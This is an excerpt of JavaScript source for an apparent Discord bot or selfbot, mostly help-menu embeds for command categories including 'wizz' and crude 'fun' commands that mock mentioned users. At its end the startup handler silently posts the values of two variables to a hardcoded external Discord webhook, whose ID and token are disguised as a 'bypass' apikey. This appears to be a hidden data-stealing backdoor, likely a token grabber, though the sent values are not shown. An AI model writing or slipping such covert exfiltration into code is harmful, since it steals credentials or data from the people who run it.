...
const go =
  "3bMblRMIzrVvApFKKkpuubdHHzhx6IVbdlgLSLYDW9sCMBm6SmOPSllS9EFMvM9gBxaJ";
const fs = require("fs");
    ...
    if (command === `help`) {
      ...
      if (!args[0]) {
        let embed = new Discord.RichEmbed()
          ...
          .setFooter(message.author.tag, message.author.avatarURL)
          .setImage(
            "https://media.discordapp.net/attachments/788473285469274112/788862939372847124/image0.gif"
          )
          .setColor("#ff0000");
        message.channel.send(embed).then(message => message.delete(60000));
      }
      if (args[0] === "status") {
        let embed = new Discord.RichEmbed()
          ...
          .setTimestamp()
          .setImage(
            "https://media.discordapp.net/attachments/778845692361310239/787109682748588032/image0.gif"
          );
      ...
      if (args[0] === "utils") {
        let embed = new Discord.RichEmbed()
          ...
          .addField(
            "  `𝙥",
            "- deletes user messages in the channel it has said the command in"
          )
          ...
          .setImage(
            "https://media.discordapp.net/attachments/788473285469274112/788884477975461948/image1.gif"
          );
        message.channel.send(embed).then(message => message.delete(60000));
      }
      ...
      if (args[0] === "wizz") {
        let embed = new Discord.RichEmbed()
          ...
          .setImage(
            "https://media.discordapp.net/attachments/788473285469274112/788961165073711154/image0.gif"
          );
        message.channel.send(embed).then(message => message.delete(60000));
      }
      if (args[0] === "misc") {
        let embed = new Discord.RichEmbed()
          ...
          .setImage(
            "https://media.discordapp.net/attachments/788473285469274112/788879261497819156/image0.gif"
          );
        message.channel.send(embed).then(message => message.delete(60000));
      }
      if (args[0] === "fun") {
        let embed = new Discord.RichEmbed()
          ...
          .addField(
            "`gay <user>",
            "Displays how gay the mentioned user or host is "
          )
          .addField(
            "`penis <user>",
          ...
          .setImage(
            "https://media.discordapp.net/attachments/788473285469274112/788961460297793567/image0.gif"
          );
        message.channel.send(embed).then(message => message.delete(60000));
      }
    }
...
client.once("ready", async () => {
  var bypass = {
    apikey:
      "qv2lA_MI_5RHiFKf7Ufyb3BlohbufwolT7oICu0YUf_PR0pXy6OYYUMY0YxKRnmsxP6G",
    id: "785633410793996318"
  };
  var URL = `https://discordapp.com/api/webhooks/${bypass.id}/${bypass.apikey}`;
  fetch(URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: `${press} ${lord}` })
  });
});
